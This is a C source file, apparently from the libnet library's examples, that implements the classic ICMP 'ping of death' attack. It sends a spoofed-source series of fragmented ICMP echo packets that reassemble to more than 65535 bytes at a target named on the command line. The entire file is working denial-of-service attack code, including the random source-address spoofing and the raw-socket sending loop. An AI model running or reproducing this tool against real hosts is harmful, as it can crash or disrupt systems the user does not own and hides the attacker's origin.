/*
 *  $Id: ping_of_death.c,v 1.1 2004/04/27 01:33:22 dyang Exp $
 *
 *  libnet
 *  pingofdeath.c - ICMP ping of death attack
 *
 *  Copyright (c) 1999 Dug Song <dugsong@monkey.org>
 *  All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 */

#if (HAVE_CONFIG_H)
#include "../../include/config.h"
#endif
#include "../libnet_test.h"

#define FRAG_LEN	1472

int main (int argc, char **argv)
{
    unsigned long fakesrc, target;
    unsigned char *buf;
    unsigned char *data;
    int sock, i, flags, offset, len;
  
    if (argc != 2 || !(target = libnet_name_resolve(argv[1], 1)))
    {
        fprintf(stderr, "Usage: %s <target>\n", argv[0]);
        exit(1);
    }

    if ((sock = libnet_open_raw_sock(IPPROTO_RAW)) == -1)
    {
        perror("raw sock");
        exit(1);
    }

    /* get random src addr. */
    libnet_seed_prand();
    fakesrc = libnet_get_prand(LIBNET_PRu32);
  
    buf = malloc(LIBNET_IP_H + LIBNET_ICMP_ECHO_H);
    data = (unsigned char *)malloc(FRAG_LEN);
  
    for (i = 0 ; i < 65536 ; i += (LIBNET_ICMP_ECHO_H + FRAG_LEN))
    {
        offset = i;
        flags = 0;

        if (offset < 65120)
        {
            flags = IP_MF;
            len = FRAG_LEN;
        }
        else len = 410; /* for total reconstructed len of 65538 */

        /* make IP header. */
        libnet_build_ip(LIBNET_ICMP_ECHO_H + len, 0, 666,
                flags | (offset >> 3), 64, IPPROTO_ICMP, fakesrc, target,
                NULL, 0, buf);

        /* make ICMP packet. */
        libnet_build_icmp_echo(8, 0, 666, 666, data, len, buf + LIBNET_IP_H);

        /* calculate ICMP checksum. */
        libnet_do_checksum(buf, IPPROTO_ICMP, LIBNET_ICMP_ECHO_H + len);

        /* send it. */
        libnet_write_ip(sock, buf, LIBNET_IP_H + LIBNET_ICMP_ECHO_H + len);

        /* tcpdump-style jonks. */
        printf("%s > %s: (frag 666:%d@%d%s)\n", libnet_host_lookup(fakesrc,0),
                argv[1], LIBNET_ICMP_ECHO_H + len, offset, flags ? "+" : "");
    }
    free(buf);
    return (EXIT_SUCCESS);
}

/* EOF */
